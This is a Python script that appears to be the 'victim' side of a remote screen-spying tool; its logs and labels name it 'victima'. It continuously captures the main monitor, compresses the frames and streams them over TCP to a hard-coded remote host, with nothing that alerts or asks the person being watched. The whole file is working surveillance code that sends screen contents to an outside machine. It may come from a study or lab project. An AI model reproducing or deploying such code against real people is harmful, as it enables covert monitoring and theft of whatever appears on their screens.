import struct
import time
import socket
import numpy as np
import logging

from collections import deque
from cv2 import cv2
from mss import mss
from threading import Thread

logFormatter = logging.Formatter(
    '%(asctime)s.%(msecs)d %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S',
)
LOGGER = logging.getLogger()
LOGGER.setLevel(logging.INFO)

fileHandler = logging.FileHandler('logs/screen_share_victima.log', mode='w')
fileHandler.setFormatter(logFormatter)
LOGGER.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
# LOGGER.addHandler(consoleHandler)

FRAME_NUM = 0


def check_time(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        return_value = func(*args, **kwargs)
        end = time.time()

        LOGGER.info(f'victima:{func.__name__}:{(end - start) * 100:.2f}ms:{FRAME_NUM}')

        return return_value
    return wrapper


def run_with_timeout(timeout=0):
    def decorator(func):
        def wrapper(*args, **kwargs):
            time.sleep(timeout)
            return func(*args, **kwargs)
        return wrapper
    return decorator


# FRAME = cv2.imread('logs/universe.png')


@check_time
def grab_screen(sct):
    return sct.grab(sct.monitors[1])


@check_time
def process_frame(frame):
    frame_arr = np.array(frame)
    resized_frame_arr = cv2.resize(frame_arr, (1200, 720), interpolation=cv2.INTER_AREA)
    _, encoded_frame_arr = cv2.imencode('.jpg', resized_frame_arr)
    return encoded_frame_arr.tobytes()


def start_frames_grabbing(frame_queue):
    sct = mss()
    while True:
        frame = grab_screen(sct)
        # frame_bytes = process_frame(frame)
        frame_queue.append(frame)


@run_with_timeout(timeout=5)
def send_frames(conn, frame_queue):
    while True:
        print(len(frame_queue))
        frame = frame_queue.popleft()
        frame_bytes = process_frame(frame)
        frame_size = len(frame_bytes)
        conn.send(struct.pack('>Q', frame_size) + frame_bytes)


def share_screen(conn):
    frame_queue = deque()

    start_frames_grabbing_thread = Thread(target=start_frames_grabbing, args=(frame_queue,))
    send_frames_thread = Thread(target=send_frames, args=(conn, frame_queue))

    start_frames_grabbing_thread.start()
    send_frames_thread.start()

    start_frames_grabbing_thread.join()
    send_frames_thread.join()


def main(host='192.168.0.139', port=9090):
    sock = socket.socket()
    sock.connect((host, port))
    try:
        share_screen(sock)
    finally:
        sock.close()


if __name__ == '__main__':
    main()
